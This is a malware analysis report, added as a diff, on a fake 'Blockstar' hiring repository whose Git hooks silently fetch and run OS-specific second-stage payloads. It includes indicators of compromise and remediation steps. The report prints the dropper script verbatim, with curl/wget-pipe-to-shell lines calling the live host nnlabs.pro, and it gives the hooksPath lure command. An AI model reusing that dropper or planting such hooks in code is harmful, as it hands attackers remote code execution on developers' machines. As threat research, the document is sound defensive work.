@@ -1,0 +1,196 @@
+# Malware Report: blockstar-ai/blockstar-hiring
+
+| Field | Value |
+|---|---|
+| **Date** | 2026-04-28 |
+| **Repository** | https://github.com/blockstar-ai/blockstar-hiring |
+| **Branch** | `master` |
+| **Threat Type** | Malware dropper via Git hooks (hiring scam) |
+| **C2 Domain** | `nnlabs.pro` |
+| **Hosting** | Hostinger International Ltd (AS47583) |
+| **Severity** | Critical — arbitrary remote code execution |
+| **Likely Attribution** | Lazarus Group / "Contagious Interview" campaign |
+
+---
+
+## Summary
+
+This repository poses as a hiring application process for a fictitious real estate tokenization startup called "Blockstar." The README instructs job applicants to clone the repo, configure a custom Git hooks path, and commit/push an application file. Following these instructions silently downloads and executes OS-specific malware from `nnlabs.pro` without any visible indication to the victim.
+
+---
+
+## Attack Chain
+
+### Phase 1 — Social Engineering
+
+The repository presents a professional-looking "Apply via GitHub" workflow. The README contains detailed instructions with a template for candidates to fill out, project documentation PDFs, and a roadmap — all designed to appear legitimate.
+
+The critical instruction is buried in the submission steps:
+
+```
+git config core.hooksPath .githooks
+```
+
+This redirects Git's hook execution from the default `.git/hooks/` (which is never shared via clone) to the repo-controlled `.githooks/` directory.
+
+### Phase 2 — Hook Execution
+
+Two active (non-`.sample`) hooks in `.githooks/` contain identical malware dropper payloads:
+
+**Trigger points in the README workflow:**
+1. `git checkout -b your-name-application` → triggers `post-checkout`
+2. `git commit -m "Add application - your name"` → triggers `pre-commit`
+
+**Payload (identical in both hooks):**
+
+```sh
+#!/bin/sh
+uname_s="$(uname -s 2>/dev/null || echo unknown)"
+case "$uname_s" in
+  Darwin)
+    curl -s 'https://nnlabs.pro/settings/mac?flag=2' | sh >/dev/null 2>&1
+    exit 0
+    ;;
+  Linux)
+    wget -qO- 'https://nnlabs.pro/settings/linux?flag=2' | sh >/dev/null 2>&1
+    exit 0
+    ;;
+  MINGW*|MSYS*|CYGWIN*)
+    curl -s https://nnlabs.pro/settings/windows?flag=2 | cmd >/dev/null 2>&1
+    exit 0
+    ;;
+  *)
+    exit 0
+    ;;
+esac
+```
+
+### Phase 3 — Remote Payload Delivery
+
+The hooks detect the victim's OS and fetch a second-stage payload:
+
+| OS | Method | URL |
+|---|---|---|
+| macOS | `curl \| sh` | `https://nnlabs.pro/settings/mac?flag=2` |
+| Linux | `wget \| sh` | `https://nnlabs.pro/settings/linux?flag=2` |
+| Windows | `curl \| cmd` | `https://nnlabs.pro/settings/windows?flag=2` |
+
+All output is redirected to `/dev/null`, making the execution completely silent. The `?flag=2` query parameter likely identifies the campaign variant.
+
+---
+
+## Indicators of Compromise
+
+### Network
+
+| Type | Value | Context |
+|---|---|---|
+| Domain | `nnlabs.pro` | C2 / payload delivery |
+| Domain | `myblockstar.com` | Fake company website |
+| IPv4 | `88.223.87.242` | nnlabs.pro A record |
+| IPv4 | `147.79.72.166` | nnlabs.pro A record |
+| IPv6 | `2a02:4780:4d:ebca:de6b:fbe1:272b:4dd6` | nnlabs.pro AAAA record |
+| IPv6 | `2a02:4780:4a:e4a3:cc4a:6e25:47c6:3d91` | nnlabs.pro AAAA record |
+| URL | `https://nnlabs.pro/settings/mac?flag=2` | macOS payload |
+| URL | `https://nnlabs.pro/settings/linux?flag=2` | Linux payload |
+| URL | `https://nnlabs.pro/settings/windows?flag=2` | Windows payload |
+
+### Infrastructure
+
+| Type | Value | Context |
+|---|---|---|
+| ASN | AS47583 | Hostinger International Ltd |
+| NS | `ns1.dns-parking.com` | nnlabs.pro nameserver |
+| NS | `ns2.dns-parking.com` | nnlabs.pro nameserver |
+| SOA | `dns.hostinger.com` | nnlabs.pro SOA |
+
+### Repository
+
+| Type | Value | Context |
+|---|---|---|
+| GitHub Org | `blockstar-ai` | Attacker organization |
+| GitHub Repo | `blockstar-ai/blockstar-hiring` | Malware distribution |
+| Commit | `9706e82` | Single commit with all content |
+
+### Host
+
+| Indicator | Description |
+|---|---|
+| `core.hooksPath` set to `.githooks` in any local repo | Enables repo-supplied hook execution |
+| Outbound connections to `nnlabs.pro` | Payload download in progress or completed |
+
+---
+
+## Repository File Inventory
+
+```
+.githooks/
+├── applypatch-msg.sample          # Standard git sample (benign)
+├── commit-msg.sample              # Standard git sample (benign)
+├── fsmonitor-watchman.sample      # Standard git sample (benign)
+├── post-checkout                  # ⚠️  MALICIOUS — malware dropper
+├── post-update.sample             # Standard git sample (benign)
+├── pre-applypatch.sample          # Standard git sample (benign)
+├── pre-commit                     # ⚠️  MALICIOUS — malware dropper
+├── pre-commit.sample              # Standard git sample (benign)
+├── pre-merge-commit.sample        # Standard git sample (benign)
+├── pre-push.sample                # Standard git sample (benign)
+├── pre-rebase.sample              # Standard git sample (benign)
+├── pre-receive.sample             # Standard git sample (benign)
+├── prepare-commit-msg.sample      # Standard git sample (benign)
+├── push-to-checkout.sample        # Standard git sample (benign)
+├── sendemail-validate.sample      # Standard git sample (benign)
+└── update.sample                  # Standard git sample (benign)
+
+applications/
+└── Roman.md                       # Placeholder ("# Blockstar" only)
+
+docs/
+├── Project Requirement.pdf        # Filler / social engineering
+└── Project Roadmap.pdf            # Filler / social engineering
+
+public/
+├── Roadmap Diagram.png
+└── Roadmap.png
+
+Project Reuqirement.md             # Note: filename typo
+Project Roadmap.md
+README.md                          # Social engineering lure
+```
+
+---
+
+## Red Flags
+
+1. **Custom `.githooks/` with active hooks** — Legitimate repos rarely ship executable (non-`.sample`) Git hooks.
+2. **`curl | sh` pattern** — Classic remote code execution. Downloads arbitrary code and pipes directly to a shell.
+3. **Silent execution** — All output suppressed via `>/dev/null 2>&1`.
+4. **Cross-platform targeting** — Hooks detect macOS, Linux, and Windows with OS-specific payloads.
+5. **Single-commit repo** — Entire repo created in one commit (`9706e82`), no development history.
+6. **Buzzword filler** — Project docs are generic blockchain/AI/AR content. Filename typo: "Reuqirement."
+7. **Fake social proof** — `applications/Roman.md` is a near-empty placeholder to suggest prior applicants.
+8. **Consistent with Lazarus Group TTPs** — Fake job + GitHub + blockchain theme + developer targeting matches the "Contagious Interview" campaign documented since 2022.
+
+---
+
+## Reporting Status
+
+| Platform | Status | Date | Reference |
+|---|---|---|---|
+| GitHub (repo) | Reported | 2026-04-28 | — |
+| Hostinger (hosting/registrar) | Reported via abuse@hostinger.com | 2026-04-28 | — |
+| Google Safe Browsing | Pending | — | — |
+| URLhaus | Pending | — | — |
+
+---
+
+## Remediation for Affected Developers
+
+If you followed the README instructions in this repository:
+
+1. **Assume full compromise.** Rotate all credentials, API keys, SSH keys, and tokens immediately.
+2. **Revoke browser sessions.** Check for unauthorized access across all accounts.
+3. **Move cryptocurrency** from any wallets accessible on the compromised machine.
+4. **Check for persistence:** crontabs, launch agents/daemons (macOS), startup items, scheduled tasks.
+5. **Audit Git config:** run `git config --global --unset core.hooksPath` and inspect all local repos.
+6. **Monitor accounts** for unauthorized activity in the following weeks.
